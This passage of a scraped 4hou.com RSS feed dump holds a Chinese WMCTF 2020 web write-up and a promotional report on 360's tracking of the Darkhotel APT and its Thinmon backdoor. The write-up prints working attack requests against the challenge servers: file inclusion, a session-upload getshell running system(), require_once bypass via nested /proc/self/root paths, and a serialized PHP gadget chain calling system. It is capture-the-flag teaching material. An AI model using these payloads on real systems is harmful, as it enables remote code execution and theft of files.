hou.com/uploads/ueditor/php/upload/image/20200818/1597730288191130.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn47@2020_5/2020/08/25/10-02-04-660_7ef5c9b1dbecce3c.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730308429161.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn87@2020_1/2020/08/25/10-02-01-217_1be15763f22f8e91.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730328888874.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn12@2020_1/2020/08/25/10-02-04-162_f151f87a2ce90812.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200818/1597730347385423.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn39@2020_6/2020/08/25/10-02-06-660_3c417a4716867dd7.webp"},"publishedOrCreatedDate":1598349711576},{"createdTime":"2020-08-25 18:01:51","updatedTime":"2020-08-25 18:01:51","title":"2020 WMCTF Web Writeup","link":"https://www.4hou.com/posts/vD7X","description":"<p><span style=\"font-size: 20px;\"><strong>前言</strong></span><br/></p><p style=\"text-align: left;\">周末打了下WMCTF，Web题量大且大多需要细致推敲，以下是部分Web题解。</p><p style=\"text-align: left;\"><span style=\"font-size: 20px;\"><strong>web_checkin</strong></span></p><p style=\"text-align: left;\">签到题不多说了，似乎是出题的时候，忘记改flag名了……直接包含即可：</p><pre class=\"brush:html;toolbar:false;\">http://web_checkin.wmctf.wetolink.com/?content=/flag</pre><p style=\"text-align:center\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526447177777.png\" title=\"1596441102152056.png\" alt=\"2020-08-01-09-26-04.png\"/></p><p><span style=\"font-size: 20px;\"><strong>no_body_knows_php_better_than_me</strong></span></p><p>题目如下:</p><pre class=\"brush:html;toolbar:false;\">&#60;?php\nhighlight_file(__FILE__);\nrequire_once&#160;&#39;flag.php&#39;;\nif(isset($_GET[&#39;file&#39;]))&#160;{\n&#160;&#160;require_once&#160;$_GET[&#39;file&#39;];\n}</pre><p>题目只给了require_once函数，由于flag.php被包含过，所以无法读取其内容。那么需要思考一些方法：</p><p><strong>· </strong>getshell</p><p><strong style=\"white-space: normal;\">·&#160;</strong>bypass require_once check</p><p>这里先讲第一种做法，因为这题环境配置出现了非预期= =：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526448135280.png\" title=\"1596441134729270.png\" alt=\"2020-08-01-19-32-53.png\"/></p><p>我们可以利用session upload progress来控制session文件内容，并进行文件包含：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526448495351.png\" title=\"1596441143834001.png\" alt=\"2020-08-01-19-33-03.png\"/></p><p>从而达成getshell的目的：</p><pre class=\"brush:html;toolbar:false;\">view-source:http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=/tmp/skysec&#38;skysec=system(&#39;cat&#160;flag.php&#39;);</pre><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526448123019.png\" title=\"1596441156998543.png\" alt=\"2020-08-01-19-33-20.png\"/><br/></p><p>这个解法已经烂大街了，就不具体分析了~</p><p><span style=\"font-size: 20px;\"><strong>web_checkin2</strong></span></p><p>题目修正了之前的非预期，修改了flag名字：</p><pre class=\"brush:html;toolbar:false;\">&#60;?php\n//PHP&#160;7.0.33&#160;Apache/2.4.25\nerror_reporting(0);\n$sandbox&#160;=&#160;&#39;/var/www/html/&#39;&#160;.&#160;md5($_SERVER[&#39;REMOTE_ADDR&#39;]);\n@mkdir($sandbox);\n@chdir($sandbox);\nhighlight_file(__FILE__);\nif(isset($_GET[&#39;content&#39;]))&#160;{\n&#160;&#160;&#160;&#160;$content&#160;=&#160;$_GET[&#39;content&#39;];\n&#160;&#160;&#160;&#160;if(preg_match(&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;,$content))\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;die(&#39;hacker&#39;);\n&#160;&#160;&#160;&#160;if(file_exists($content))\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;require_once($content);\n&#160;&#160;&#160;&#160;file_put_contents($content,&#39;&#60;?php&#160;exit();&#39;.$content);\n}</pre><p>在该篇文章里已经有一定的分析了：</p><pre class=\"brush:html;toolbar:false\">https://www.anquanke.com/post/id/202510</pre><p>但文章中涉及的内容都被waf拦截了，这里有2种方式:</p><p><strong>想出一个新的办法</strong></p><p><strong>利用file_put_content会解url编码的特性，进行2次编码绕过</strong></p><p>二次编码就不提了，这里简单看一下新的方法，可以利用zlib.deflate和zlib.inflate解压缩的方式来绕过：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526449163918.png\" title=\"1596526350144782.png\" alt=\"image.png\"/></p><p>成功getshell:</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526450573382.png\" title=\"1596441211597565.png\" alt=\"2020-08-02-18-14-49.png\"/></p><p>读取flag文件：</p><pre class=\"brush:html;toolbar:false;\">fffffllllllllaaaaaggggggg_as89c79as8</pre><p>获得flag：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526451141189.png\" title=\"1596441223122912.png\" alt=\"2020-08-02-18-17-27.png\"/></p><p><strong style=\"font-size: 20px;\">Make PHP Great Again 2.0</strong><br/></p><p>此题修复了之前可用session upload progress进行getshell的非预期解法，那么只能尝试进行require_once的绕过了，分析到其实现源码：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526452191128.png\" title=\"1596441234112928.png\" alt=\"2020-08-02-20-24-09.png\"/></p><p>发现require文件时，在对软链接的操作上存在一些缺陷，似乎并不会进行多次解析获取真实路径。</p><p>但是如何找到flag.php文件的软链接呢？这里可以再如下路径中发现：</p><pre class=\"brush:html;toolbar:false;\">/proc/self/root/var/www/html/index.php</pre><p>我们尝试套娃：</p><pre class=\"brush:html;toolbar:false;\">http://v2222.no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/index.php</pre><p>发现可以成功包含文件：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526452730835.png\" title=\"1596441287173477.png\" alt=\"2020-08-03-14-33-39.png\"/></p><p>那么使用伪协议来读取flag：</p><pre class=\"brush:html;toolbar:false;\">http://v2222.no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</pre><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526452200177.png\" title=\"1596441325102149.png\" alt=\"2020-08-02-20-44-59.png\"/></p><p><strong style=\"font-size: 20px;\">webweb</strong><br/></p><p>题目又是给了一个反序列化语句:</p><pre class=\"brush:html;toolbar:false;\">unserialize($_GET[&#39;a&#39;]);</pre><p>考察对gadget的串联能力。</p><p>这里还是从__destruct入手，选择CLI\\Agent::__destruct：</p><pre class=\"brush:html;toolbar:false;\">&#160;&#160;&#160;&#160;function&#160;__destruct()&#160;{\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if&#160;(isset($this-&#62;server-&#62;events[&#39;disconnect&#39;]))\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;{\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$func=$this-&#62;server-&#62;events[&#39;disconnect&#39;];\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if(is_callable($func)){\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$func($this);\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}\n&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;}\n&#160;&#160;&#160;&#160;}</pre><p>此处根据：</p><pre class=\"brush:html;toolbar:false;\">$this-&#62;server-&#62;events[&#39;disconnect&#39;]</pre><p>我们可以尝试将$func控制为任意函数，随便选择一个类来使用：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526454707885.png\" title=\"1596441358142867.png\" alt=\"2020-08-03-15-35-54.png\"/></p><p>那么选择哪个函数来使用进行RCE就非常重要，这里由于无法控制参数，因此直接找php built-in函数或许不行。那么只能考虑构造__call的方法，来进行攻击，搜寻类似于如下情况的例子：</p><pre class=\"brush:html;toolbar:false;\">$xxx-&#62;xxxx($this-&#62;xxxx)</pre><p>观察上述格式的语句可能出现的函数，然后兴许可以触发__call，并且达到参数可控的目的。</p><p>这里搜罗一番，可以找到CLI\\Agent::fetch：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526454194498.png\" title=\"1596441371741717.png\" alt=\"2020-08-03-15-38-26.png\"/></p><p>此处，我们发现目标对象可控，参数可控，天时地利人和，只差危险的__call函数。</p><p>这里搜索__call函数需要优先考虑函数名可控情况，这里搜寻可发现DB\\SQL\\Mapper::__call:</p><pre class=\"brush:html;toolbar:false;\">function&#160;__call($func,$args)&#160;{\n&#160;&#160;&#160;&#160;return&#160;call_user_func_array(\n&#160;&#160;&#160;&#160;(array_key_exists($func,$this-&#62;props)?\n&#160;&#160;&#160;&#160;$this-&#62;props[$func]:\n&#160;&#160;&#160;&#160;$this-&#62;$func),$args\n&#160;&#160;&#160;&#160;);\n}</pre><p>其函数名为：</p><pre class=\"brush:html;toolbar:false;\">$this-&#62;props[$func]</pre><p>完全可以通过数组进行bypass。</p><p>因此可构造exp：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526446145469.png\" title=\"1596526446145469.png\" alt=\"image.png\"/></p><p>当然这里在测试时，发现直接使用CLI\\Agent不行，在autoload时：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526455149065.png\" title=\"1596441404191699.png\" alt=\"2020-08-03-15-42-05.png\"/></p><p>发现文件包含错误，导致我们反序列化时，找不到类的定义：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526455250631.png\" title=\"1596441411189887.png\" alt=\"2020-08-03-15-42-26.png\"/></p><p>于是先从CLI\\WS入手，让其包含正确的CLI\\Agent定义文件：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526456687555.png\" title=\"1596441416188758.png\" alt=\"2020-08-03-15-20-24.png\"/></p><p>我们来获取flag：</p><pre class=\"brush:html;toolbar:false;\">http://webweb.wmctf.wetolink.com/?a=O%3A6%3A%22CLI%5CWS%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3BO%3A5%3A%22Image%22%3A1%3A%7Bs%3A6%3A%22events%22%3Ba%3A1%3A%7Bs%3A10%3A%22disconnect%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A4%3A%22read%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A9%3A%22%00%2A%00socket%22%3Bs%3A2%3A%22ls%22%3B%7Di%3A1%3Bs%3A5%3A%22fetch%22%3B%7D%7D%7Ds%3A9%3A%22%00%2A%00socket%22%3Bs%3A0%3A%22%22%3B%7D%7D</pre><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526456132398.png\" title=\"1596441431987904.png\" alt=\"2020-08-03-15-44-24.png\"/></p><p>寻找flag文件：</p><pre class=\"brush:html;toolbar:false;\">&#160;&#160;&#160;&#160;$a&#160;=&#160;new&#160;DB\\SQL\\Mapper(array(&#34;read&#34;=&#62;&#34;system&#34;));\n&#160;&#160;&#160;&#160;$b=&#160;new&#160;CLI\\Agent($a,&#39;find&#160;/&#160;|&#160;grep&#160;flag&#39;);\n&#160;&#160;&#160;&#160;$c&#160;=&#160;new&#160;Image(array(&#34;disconnect&#34;=&#62;array($b,&#39;fetch&#39;)));\n&#160;&#160;&#160;&#160;$d&#160;=&#160;new&#160;CLI\\Agent($c,&#39;&#39;);\n&#160;&#160;&#160;&#160;$e&#160;=&#160;new&#160;CLI\\WS($d);\n&#160;&#160;&#160;&#160;echo&#160;urlencode(serialize($e)).&#34;\\n&#34;;</pre><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526456483190.png\" title=\"1596441452442798.png\" alt=\"2020-08-03-15-45-04.png\"/></p><p>获取flag：</p><pre class=\"brush:html;toolbar:false;\">&#160;&#160;&#160;&#160;$a&#160;=&#160;new&#160;DB\\SQL\\Mapper(array(&#34;read&#34;=&#62;&#34;system&#34;));\n&#160;&#160;&#160;&#160;$b=&#160;new&#160;CLI\\Agent($a,&#39;cat&#160;/etc/flagzaizheli&#39;);\n&#160;&#160;&#160;&#160;$c&#160;=&#160;new&#160;Image(array(&#34;disconnect&#34;=&#62;array($b,&#39;fetch&#39;)));\n&#160;&#160;&#160;&#160;$d&#160;=&#160;new&#160;CLI\\Agent($c,&#39;&#39;);\n&#160;&#160;&#160;&#160;$e&#160;=&#160;new&#160;CLI\\WS($d);\n&#160;&#160;&#160;&#160;echo&#160;urlencode(serialize($e)).&#34;\\n&#34;;</pre><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526457155284.png\" title=\"1596441471206719.png\" alt=\"2020-08-03-15-45-57.png\"/></p><p><strong style=\"font-size: 20px;\">后记</strong><br/></p><p>这次比赛web题量太大，还有一些题目值得推敲，后续有空复现再继续写吧XD~</p>","descriptionType":"text/html","publishedDate":"Tue, 25 Aug 2020 04:27:23 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526447177777.png","linkMd5":"f8690d9c234135c7e23dc40e00906975","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn31@2020_2/2020/08/25/10-01-54-972_66cf45a0d3f1d903.webp","destWidth":1106,"destHeight":566,"sourceBytes":91067,"destBytes":65348,"author":"一叶飘零","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526447177777.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn31@2020_2/2020/08/25/10-01-54-972_66cf45a0d3f1d903.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526448135280.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn100@2020_6/2020/08/25/10-02-01-705_fffa0ff0d27c8caf.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526448495351.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn83@2020_5/2020/08/25/10-02-04-578_8edae2b8edb0aa51.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526448123019.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn60@2020_1/2020/08/25/10-02-03-177_538a60e9bd6097fa.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526449163918.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn8@2020_2/2020/08/25/10-02-03-346_34f2d15f18780a06.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526450573382.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn43@2020_5/2020/08/25/10-02-04-016_fdd228156ebf4ae1.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526451141189.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn91@2020_6/2020/08/25/10-02-03-908_70e5c603819b6660.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526452191128.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn79@2020_2/2020/08/25/10-02-04-042_0696cdcf705bb0a3.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526452730835.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn4@2020_4/2020/08/25/10-02-04-953_b44af07448b1ec6b.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526452200177.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn64@2020_1/2020/08/25/10-02-12-659_9314b8455c93da32.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526454707885.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn11@2020_5/2020/08/25/10-02-03-622_9806c987ceb6c474.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526454194498.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn19@2020_3/2020/08/25/10-02-06-410_77e494ffe6ec8a48.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526446145469.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn15@2020_3/2020/08/25/10-02-05-364_ac3f7d1cc1131dab.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526455149065.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn51@2020_6/2020/08/25/10-02-03-788_ca9e55a7bc64cd9a.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526455250631.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn3@2020_6/2020/08/25/10-02-01-744_b5a046747bb091d8.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526456687555.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn80@2020_2/2020/08/25/10-02-04-793_7a69e560c51cbf23.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526456132398.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn96@2020_5/2020/08/25/10-02-01-197_5f19d85f047769a5.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526456483190.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn68@2020_6/2020/08/25/10-02-01-954_dc9c434799c69040.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200804/1596526457155284.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn83@2020_4/2020/08/25/10-02-01-492_1fd4d12c5d684e74.webp"},"publishedOrCreatedDate":1598349711578},{"createdTime":"2020-08-25 18:01:51","updatedTime":"2020-08-25 18:01:51","title":"游走在黑暗森林里的“狩猎者”与“黑店”组织的十年斗法","link":"https://www.4hou.com/posts/MoV3","description":"<p>看似平静的网络空间，实则暗潮汹涌，其中不乏无数勇立潮头的捍卫者，时刻守护着网络空间的安全。在此其中，一支安全团队脱颖而出——&#160;360高级威胁研究院（ATA）。</p><p>近期，360高级威胁研究院（ATA）又一次独家发现了APT组织Darkhotel（译名“黑店”）的新实锤，并登上ISC 2020大会，首次重磅发布了这次魔道斗法的全过程。</p><p>一边是游走在网络空间里的安全捍卫者，曾实力捕获全球约40个APT组织；一边是时刻企图肆虐网络的威胁制造者，曾连续针对我国各领域发起网络侵袭，此次再度掀起风云对话，战局走势不免引人关注。</p><p>&#160;<img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347623177436.png\" title=\"1598347530129422.png\" alt=\"1.png\"/>&#160;</p><p>&#160;</p><p style=\"text-align: center;\"><strong>追踪十年“黑店”</strong></p><p style=\"text-align: center;\"><strong>360 ATA再度披露惊天恶绩</strong></p><p>&#160;首先，说起拥有着东亚背景APT组织Darkhotel，其相关攻击行动最早可以追溯到2007年。因为长期针对企业高管、政府机构、国防工业、电子工业等重要机构实施网络间谍攻击活动，其一系列的作恶行径让网络安全领域波澜迭起。</p><p>而在2014年11月，当这个专门将攻击目标锁定为企业高管的间谍组织开始浮出水面，其足迹早已遍布中国、朝鲜、日本、缅甸、俄罗斯等全球多国。</p><p>刀尖行走势必会百密一疏。随着Darkhotel露出马脚，360高级威胁研究院开始了对其的长期持续性追踪，一夕间，从所向披靡到被处处针对，Darkhotel似乎尝尽败绩。</p><ul class=\" list-paddingleft-2\" style=\"list-style-type: disc;\"><li><p>2018年4月，360高级威胁研究院率先监测到Darkhotel组织瞄准中、俄、日、韩等国政府及组织机构或企业单位，尤其针对中国重点省份外贸企业单位和相关机构展开攻击；<br/></p></li><li><p>今年2月，在Win 7停服之际，360高级威胁研究院全球首家捕获Darkhotel组织利用“双星”0day漏洞，瞄准我国商贸相关的政府机构发动攻击；</p></li><li><p>今年3月，360高级威胁研究院再次捕获到Darkhotel组织，劫持某VPN厂商下发恶意文件，锁定中国驻外机构、政府相关单位发动定向攻击。</p></li></ul><p>&#160;交手数次，360高级威胁研究院发现老对头Darkhotel组织近年攻击行动越发频繁和“肆无忌惮”，其中已知的行为就包括W行动、Darkhotel、Erebus、Daybreak、Thinmon等。不仅如此，该组织使用的恶意代码极为复杂，漏洞武器库也极其充实，囊括双杀0day、双星0day等在内。</p><p>&#160;<img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347624191329.png\" title=\"1598347562218773.png\" alt=\"2.png\"/>&#160;</p><p>就在今年3月的这次攻击中，360高级威胁研究院利用360安全大脑发现DarkHotel使用了一个从未被披露过的全新后门框架，并根据该攻击组件的文件名将其命名为“Thinmon”后门框架。</p><p>继续深挖之下，这个神秘的全新后门框架实际上掩盖着另一个惊天秘密——自2017年起，Darkhotel利用这一框架，对我国实施了长达三年的持续性攻击。</p><p>&#160;</p><p>&#160;</p><p style=\"text-align: center;\"><strong>360 ATA独家披露全新秘密武器</strong></p><p style=\"text-align: center;\"><strong>Thinmon究竟是何方神圣？</strong></p><p>“后门程序”，如同“开天窗”的管理员身份。Thinmon这一后门程序其中不乏屏幕截图、文件窃取、键盘记录、远程监控等功能，且其插件在计算机中皆以二进制加密的形式存放在临时目录，只有在需要被加载启动时，调度模块才会对其解密并加载。</p><p></p><p><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347626998550.png\" title=\"1598347604166171.png\"/></p><p></p><p></p><p>&#160;<img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347625303236.png\" title=\"1598347604132671.png\"/></p><p>可以说，Thinmon是黑客组织长期潜伏渗透，进行情报窃取的绝佳间谍手段。</p><p>利用这款秘密武器，黑店针对我国东部沿海地区以及靠近朝鲜半岛的地区发起攻击，涵盖了政府、驻华机构、外贸、新闻媒体等多个行业，其中与贸易有关的企业占比最多达到1/4，其次是政府机构、新闻媒体，大型国企、高等院校。在最近的VPN劫持攻击事件中，有多个中国驻外机构受到了攻击。</p><p>360高级威胁研究院究竟是如何顺着蛛丝马迹找出“黑店”隐匿三年的真相？无非是凭借敏锐的关联力与识别力。</p><p>&#160;</p><p style=\"text-align: center;\"><strong>黑暗森林里的狩猎者</strong></p><p style=\"text-align: center;\"><strong>360 ATA身经百战</strong></p><p>这里有必要介绍一下360高级威胁研究院（以下简称为360 ATA），它是360政企安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究。曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露过40多起国家级APT组织的高级行动，安全能力在行业内是相当受认可的。</p><p>&#160;和大家简单回顾一下团队的成绩：</p><p>2017年10月，360 ATA率先发现Office高危漏洞(CVE-2017-11826)，这是360代表中国安全厂商在业界披露的第一起APT组织0day在野攻击事件。该漏洞非常危险，打开恶意文档就会中招，可影响所有Office主流版本，且已被不法黑客恶意利用。当时，360紧急向微软报告了漏洞细节，同时为网民全面拦截利用该漏洞的攻击。</p><p>&#160;还是2018年，360 ATA又率先监测到一例使用0day漏洞的APT攻击，该攻击是全球首个使用浏览器0day漏洞的新型Office文档攻击，只要打开恶意文档就可能中招，被黑客植入后门木马甚至可以完全控制电脑。360 ATA第一时间向微软报告了漏洞细节，并将该漏洞命名为“双杀”漏洞。</p><p>&#160;再来看今年的成绩，就在今年1月微软宣布Windows 7系统停服前夕，360 ATA捕获到全球首例同时复合利用IE浏览器和火狐浏览器两个0day漏洞的攻击，并将其命名为“双星”0day漏洞攻击。在微软放弃了Win7系统更新，且未联合安全厂商继续支持安全防护的背景下，360迅速推出了Win7盾甲，帮助仍在使用Windows 7系统的用户拦截此漏洞攻击。</p><p>&#160;<img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347653948129.png\" title=\"1598347653948129.png\" alt=\"4.png\"/>&#160;</p><p>就在上个月，360 ATA还独家揭露了全新APT组织WellMess，并将其命名为“魔鼠”，单独编号为APT-C-42。目前，此APT组织的攻击能力、攻击时长、攻击威胁等特点已被360 ATA悉数掌握。</p><p>&#160;如果将网络安全世界比作危机四伏、荆棘密布的森林，360 ATA就是黑暗森林里的狩猎者。在360 ATA眼里，威胁越多越是狩猎者的天地，置身考验反应速度和战斗力的“斗兽场”，第一时间精准捕获“猎物”是360 ATA的一贯作风。</p><p>&#160;</p><p style=\"text-align: center;\"><strong>立于巨人肩膀</strong></p><p style=\"text-align: center;\"><strong>360 ATA不是神话但绝非运气</strong></p><p>&#160;上面列举的只是一部分成绩，事实上360 ATA在挖掘0day漏洞和APT攻击方面可谓身经百战，不谦虚的地说，行业里能与之匹敌团队不多。</p><p>&#160;之所以能够让其他团队望尘莫及，一方面是360 ATA集合了全球顶尖的安全人才，这意味着牢牢攥住了全球领先的安全能力。让360 ATA赢在起跑线的另一大关键，是背后360集团在全球视野和安全理念上的加持。</p><p>&#160;面对网络世界的刀光剑影，网络安全道阻且长。</p><p>&#160;就拿此次揭露的Darkhotel（APT-C-06）为例，无疑将成为网安世界有序运行的又一大“阻碍”，小到企事单位，大到国家级关键部门极有可能成为其后门程序的攻击目标。可以预见的是，随着全球数字化转型的加速，高级持续性威胁（APT）已成为干系到政府、国防安全的重大威胁，这场第五空间的“战争”已经升维到了史无前例的高度。</p><p>&#160;在不乐观的国际网安环境之下，360提出&#160;“统领全局的顶层设计和谋略”，以一套网络安全新理念和新框架帮助国家、政府和企业构建新一代安全能力体系，整体提升应对高级威胁攻击的安全能力。对360 ATA而言，则是站在巨人的肩膀上，充分利用着360在人才、数据、技术上的支持，才得以实现超然的战绩。</p><p>&#160;360 ATA的存在不是神话，但绝非运气，团队将持续监测Darkhotel组织的攻击活动。据悉，目前360威胁情报云、APT全景雷达等360全线安全产品也已支持对该组织的攻击检测。建议相关单位提高警惕，保护好关键网络基础设施的安全，同时对客户端做好安全漏洞补丁的更新，并定期进行病毒查杀。</p><p><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347678526314.png\" title=\"1598347678526314.png\" alt=\"5.png\"/></p>","descriptionType":"text/html","publishedDate":"Tue, 25 Aug 2020 09:28:57 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347623177436.png","linkMd5":"719d0e33d92b39b5ce9b86bc27274aa0","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn28@2020_4/2020/08/25/10-01-58-897_5e93c5d19c3d256f.webp","destWidth":830,"destHeight":610,"sourceBytes":163538,"destBytes":30694,"author":"高坂穗乃果","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347623177436.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn28@2020_4/2020/08/25/10-01-58-897_5e93c5d19c3d256f.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347624191329.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn75@2020_3/2020/08/25/10-02-06-278_9dc4750ebc7be5e0.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347626998550.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn52@2020_3/2020/08/25/10-02-04-263_a557ca8c58b04b42.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347625303236.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn27@2020_1/2020/08/25/10-02-04-631_f98cc3752d4eaeb0.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347653948129.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn63@2020_5/2020/08/25/10-02-09-290_4e296f5e14774143.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598347678526314.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn24@2020_6/2020/08/25/10-02-04-303_c9d9650c768f4a4b.webp"},"publishedOrCreatedDate":1598349711555},{"createdTime":"2020-08-25 18:01:51","updatedTime":"2020-08-25 18:01:51","title":"黑产攻击手段隐蔽升级 